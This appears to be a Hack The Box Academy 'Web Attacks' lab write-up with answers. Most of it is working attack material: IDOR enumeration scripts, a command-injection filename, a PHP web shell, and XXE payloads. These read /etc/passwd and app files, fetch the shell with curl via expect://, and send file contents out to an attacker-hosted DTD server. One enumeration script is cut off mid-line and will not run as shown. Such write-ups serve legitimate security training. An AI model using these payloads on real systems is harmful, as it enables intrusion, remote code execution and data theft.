# [HTB] Web Attacks

## Bypassing Basic Authentication

>**Q. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.**

## Bypassing Security Filters
 
>**Q. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./**

## Mass IDOR Enumeration

>**Q. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**
```sh
sudo nano documents.sh
sudo chmod +x documents.sh
```
```sh
#!/bin/bash


for i in {0..50}; do
        for link in $(curl -X POST http://83.136.250.34:49965/documents.php -d >
                wget -q http://83.136.250.34:49965/$link
        done
done
```
```sh
./documents.sh

```

## Bypassing Encoded References

>**Q. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**
```sh
sudo nano encode.sh
sudo chmod +x encode.sh
```
```sh
#!/bin/bash


for i in {1..20}; do
    for hash in $( (echo -n $i | base64 -w 0) |jq -sRr @uri); do
        curl -s "http://83.136.250.34:36131/download.php?contract=$hash"
    done
done
```


## IDOR in Insecure APIs

>**Q. Try to read the details of the user with 'uid=5'. What is their 'uuid' value?**

## Chaining IDOR Vulnerabilities

>**Q. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.**

## Local File Disclosure

>**Q. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```
```
[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
[/htb]$ sudo python3 -m http.server 80
```
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
## Advanced Exfiltration with CDATA
```Code: xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

```
Mdmithu@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Mdmithu@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```
Code: xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
## Advanced File Disclosure

>**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**

```bash
sudo nano xxe.dtd
```

```dtd
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

## (web_attacks_xxe_exfil_error_2.jpg)[https://github.com/mithu9554/HTB_Academy/blob/main/HTB_Web_Attacks/web_attacks_xxe_exfil_error_2.jpg]

```bash
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.1:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration

>**Q. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.**
```bash
sudo nano xxe2.dtd 
```

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.1:8000/?content=%file;'>">
```

```bash
php -S 0.0.0.0:8000
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
### Automated OOB Exfiltration
```
[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```
```
Code: http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
```
[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

## Web Attacks - Skills Assessment

>**Q. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.**

```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
            <root>
            <name>&xxe;</name>
            <details>test</details>
            <date>2023-07-18</date>
            </root>
```
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
            <root>
            <name>&xxe;</name>
            <details>test</details>
            <date>2023-07-18</date>
            </root>
```
